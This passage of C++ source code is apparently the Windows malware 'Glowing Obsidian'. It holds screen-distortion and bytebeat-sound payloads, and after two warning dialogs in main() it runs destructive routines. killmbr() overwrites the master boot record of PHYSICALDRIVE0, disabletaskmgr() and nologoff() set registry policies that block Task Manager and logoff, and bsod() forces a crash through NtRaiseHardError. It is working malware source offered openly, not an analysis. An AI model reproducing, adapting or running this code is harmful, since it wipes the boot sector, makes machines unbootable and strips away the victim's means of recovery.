		DrawIconEx(hdc, p.x, p.y, LoadIconW(GLOWINGOBSIDIANICON, MAKEINTRESOURCE(1)), 64, 64, NULL, NULL, DI_NORMAL);
		switch (status) {
		case 0: //↖
			icnNum = 32513;
			p.x -= 64;
			p.y -= 64;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //↗
			icnNum = 32514;
			p.x += 64;
			p.y -= 64;
			if (p.x >= w - 64 || p.y < 0) {
				if (p.x >= w - 64) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //↙
			icnNum = 32515;
			p.x -= 64;
			p.y += 64;
			if (p.x < 0 || p.y >= h - 64) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 64) {
					status = 0;
				}
			}
			break;
		case 3: //↘
			icnNum = 32516;
			if (p.x >= w - 64 && p.y >= h - 64) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 64;
			p.y += 64;
			if (p.x >= w - 64 || p.y >= h - 64) {
				if (p.x >= w - 64) {
					status = 2;
				}
				if (p.y >= h - 64) {
					status = 1;
				}
			}
			break;
		}
		Sleep(25);
	}
}

DWORD WINAPI mypayload62k(LPVOID lpParam) {
	HINSTANCE GLOWINGOBSIDIANICON2K = LoadLibrary(_T("GLOWINGOBSIDIANICON2K.dll"));
	int dwStartTime = time(NULL);
	int status = 3;
	int icnNum = 32516;
	POINT p;
	p.x = 0, p.y = 0;
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		DrawIconEx(hdc, p.x, p.y, LoadIconW(GLOWINGOBSIDIANICON2K, MAKEINTRESOURCE(1)), 64, 64, NULL, NULL, DI_NORMAL);
		switch (status) {
		case 0: //↖
			icnNum = 32513;
			p.x -= 8;
			p.y -= 8;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //↗
			icnNum = 32514;
			p.x += 8;
			p.y -= 8;
			if (p.x >= w - 8 || p.y < 0) {
				if (p.x >= w - 8) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //↙
			icnNum = 32515;
			p.x -= 8;
			p.y += 8;
			if (p.x < 0 || p.y >= h - 8) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 8) {
					status = 0;
				}
			}
			break;
		case 3: //↘
			icnNum = 32516;
			if (p.x >= w - 8 && p.y >= h - 8) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 8;
			p.y += 8;
			if (p.x >= w - 8 || p.y >= h - 8) {
				if (p.x >= w - 8) {
					status = 2;
				}
				if (p.y >= h - 8) {
					status = 1;
				}
			}
			break;
		}
		Sleep(25);
	}
}

DWORD WINAPI colorbezier(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HDC hdc = GetDC(0);
		POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh, rand() % sw, rand() % sh };
		HPEN hPen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hPen);
		PolyBezier(hdc, p, 4);
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
		Sleep(25);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader41(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x & y) * RGB(GetRValue(fe(255)), GetGValue(fe(255)), GetBValue(fe(255)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI doudong(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		StretchBlt(hdc, rand() % 3 - 1, rand() % 3 - 1, sw + rand() % 3 - 1, sh + rand() % 3 - 1, hdc, 0, 0, sw, sh, SRCPAINT);
	}
	return(0);
}

DWORD WINAPI train(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	for (;;) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, -15, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, w - 15, 0, w, h, hdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(25);
	}
}

DWORD WINAPI manysquares(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	HINSTANCE GLOWINGOBSIDIANICON = LoadLibrary(_T("GLOWINGOBSIDIANICON.dll"));
	for (;;) {
		int x1 = rand() % sw;
		int y1 = rand() % sh;
		HBRUSH brush1 = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		Rectangle(hdc, x1, y1, 100 + x1, 100 + y1);
		Sleep(50);
		int x2 = rand() % sw;
		int y2 = rand() % sh;
		StretchBlt(hdc, x2, y2, 100, 100, hdc, x2, y2, 100, 100, NOTSRCCOPY);
		Sleep(50);
		int x3 = rand() % sw;
		int y3 = rand() % sh;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		StretchBlt(hdc, x3, y3, 100, 100, hdc, x3, y3, 100, 100, PATINVERT);
		Sleep(50);
		int x4 = rand() % sw;
		int y4 = rand() % sh;
		DrawIconEx(hdc, x4, y4, LoadIconW(GLOWINGOBSIDIANICON, MAKEINTRESOURCE(1)), 100, 100, NULL, NULL, DI_NORMAL);
		Sleep(50);
	}
}

DWORD WINAPI manysquares2k(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	HINSTANCE GLOWINGOBSIDIANICON2K = LoadLibrary(_T("GLOWINGOBSIDIANICON2K.dll"));
	for (;;) {
		int x1 = rand() % sw;
		int y1 = rand() % sh;
		HBRUSH brush1 = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		Rectangle(hdc, x1, y1, 100 + x1, 100 + y1);
		Sleep(50);
		int x2 = rand() % sw;
		int y2 = rand() % sh;
		StretchBlt(hdc, x2, y2, 100, 100, hdc, x2, y2, 100, 100, NOTSRCCOPY);
		Sleep(50);
		int x3 = rand() % sw;
		int y3 = rand() % sh;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		StretchBlt(hdc, x3, y3, 100, 100, hdc, x3, y3, 100, 100, PATINVERT);
		Sleep(50);
		int x4 = rand() % sw;
		int y4 = rand() % sh;
		DrawIconEx(hdc, x4, y4, LoadIconW(GLOWINGOBSIDIANICON2K, MAKEINTRESOURCE(1)), 100, 100, NULL, NULL, DI_NORMAL);
		Sleep(50);
	}
}

DWORD WINAPI manycircles(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		int x1 = rand() % sw;
		int y1 = rand() % sh;
		HBRUSH brush1 = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		Ellipse(hdc, x1, y1, 100 + x1, 100 + y1);
		Sleep(50);
		int x2 = rand() % sw;
		int y2 = rand() % sh;
		HRGN hrgn1 = CreateEllipticRgn(x2, y2, x2 + 100, y2 + 100);
		SelectClipRgn(hdc, hrgn1);
		StretchBlt(hdc, x2, y2, 100, 100, hdc, x2, y2, 100, 100, NOTSRCCOPY);
		Sleep(50);
		int x3 = rand() % sw;
		int y3 = rand() % sh;
		HRGN hrgn2 = CreateEllipticRgn(x3, y3, x3 + 100, y3 + 100);
		SelectClipRgn(hdc, hrgn2);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		StretchBlt(hdc, x3, y3, 100, 100, hdc, x3, y3, 100, 100, PATINVERT);
		Sleep(50);
	}
}

DWORD WINAPI shader0(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x * y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI mypayload1c(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	int w;
	for (;;) {
		hdc = GetDC(0);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		w = rand() % sw;
		BitBlt(hdc, w, 0, 10, sh, hdc, w, 0, PATINVERT);
		Sleep(25);
	}
}

DWORD WINAPI mypayload2c(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	int h;
	for (;;) {
		hdc = GetDC(0);
		h = rand() % sh;
		BitBlt(hdc, 0, h, sw, 10, hdc, 0, h, NOTSRCCOPY);
		Sleep(25);
	}
}

DWORD WINAPI squares2(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	for (;;) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		StretchBlt(hdc, top_x, top_y, 100, 100, hdc, top_x, top_y, 100, 100, PATINVERT);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(20);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI balls(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	for (;;) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HRGN hrgn1 = CreateEllipticRgn(top_x, top_y, top_x + 100, top_y + 100);
		SelectClipRgn(hdc, hrgn1);
		StretchBlt(hdc, top_x, top_y, 100, 100, hdc, top_x, top_y, 100, 100, NOTSRCCOPY);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(20);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 5 | t >> 8)) >> (t << 4);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (5 + ((t & t >> 8) | (t ^ t >> 13) | t >> 16) % 16)) * t << 1);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 * (t >> 2) | (t >> 4));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t >> 10) * t >> 8 | t >> 16);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

//((t*(5+((t&t>>8)|(t^t>>13)|t>>16)%16))*t<<1)

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t >> 12 & t >> 8) | (t >> 20 & t >> 12)) * (t << 3));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(5 * t & t >> 7 | (3 * t & t >> 10) - t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(9 * t & t >> 4 | 5 * t & t >> 7) - 20;
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 5 | t >> 8 | t >> 80 ^ t) + 64) >> (t >> 16);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 12 | t >> 8));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(2 * t * (t & 16384 ? 6 : 5) * (4 - (3 & t >> 8)) >> (3 & -t >> (t & 4096 ? 2 : 15)) | t >> (t & 8192 ? t & 4096 ? 4 : 5 : 3));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void disabletaskmgr()
{
	HKEY hkey;
	DWORD value = 1;
	RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

void nologoff()
{
	HKEY hkey;
	DWORD value = 1;
	RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
	RegSetValueEx(hkey, L"NoLogOff", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

int killmbr()
{
	BYTE pmbr[11264] = { 0 };
	DWORD write;
	HANDLE mbr;
	char mbrdata[mbrsize] = boot;
	memcpy(pmbr, mbrdata, sizeof(mbrdata) - 1);
	pmbr[510] = 0x55;
	pmbr[511] = 0xAA;
	mbr = CreateFile
	(
		L"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (WriteFile(mbr, pmbr, sizeof(pmbr), &write, NULL) == TRUE)
	{
	}
	else
	{
	}
	CloseHandle(mbr);
	return EXIT_SUCCESS;
}

void bsod() {
	typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
	typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
	ExitProcess(0);
}

int main() {
	OSVERSIONINFOEXW osvi = { 0 };
	DWORDLONG dwlConditionMask = 0;
	ZeroMemory(&osvi, sizeof(osvi));
	osvi.dwOSVersionInfoSize = sizeof(osvi);
	osvi.dwMajorVersion = 5;
	osvi.dwMinorVersion = 0;
	VER_SET_CONDITION(dwlConditionMask, VER_MAJORVERSION, VER_EQUAL);
	VER_SET_CONDITION(dwlConditionMask, VER_MINORVERSION, VER_EQUAL);
	if (VerifyVersionInfo(&osvi, VER_MAJORVERSION | VER_MINORVERSION, dwlConditionMask))
	{
		CREATE_NO_WINDOW;
		if (MessageBoxW(NULL, L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"Glowing Obsidian.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Glowing Obsidian.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
			{
				ExitProcess(0);
			}
			else
			{
				killmbr();
				disabletaskmgr();
				nologoff();
				icon2kdll(1);
				sound1();
				HANDLE thread0 = CreateThread(0, 0, mousedrawicon, 0, 0, 0);
				HANDLE thread0b = CreateThread(0, 0, ColorInvert, 0, 0, 0);
				HANDLE thread1 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread1, 0);
				HANDLE thread2 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread2, 0);
				HANDLE thread3 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread3, 0);
				HANDLE thread4 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread4, 0);
				HANDLE thread5 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread5, 0);
				HANDLE thread6 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread6, 0);
				HANDLE thread7 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread7, 0);
				HANDLE thread8 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread8, 0);
				HANDLE thread9 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread9, 0);
				HANDLE thread10 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread10, 0);
				HANDLE thread11 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread11, 0);
				HANDLE thread12 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread12, 0);
				HANDLE thread13 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread13, 0);
				HANDLE thread14 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread14, 0);
				HANDLE thread15 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread15, 0);
				HANDLE thread16 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread16, 0);
				HANDLE thread17 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread17, 0);
				HANDLE thread18 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread18, 0);
				HANDLE thread19 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread19, 0);
				HANDLE thread20 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread20, 0);
				HANDLE thread21 = CreateThread(0, 0, lazhai, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread21, 0);
				HANDLE thread22 = CreateThread(0, 0, ladi, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread22, 0);
				HANDLE thread23 = CreateThread(0, 0, lakuan, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread23, 0);
				HANDLE thread24 = CreateThread(0, 0, lagao, 0, 0, 0);
				Sleep(1250);
				TerminateThread(thread0b, 0);
				TerminateThread(thread24, 0);
				sound2();
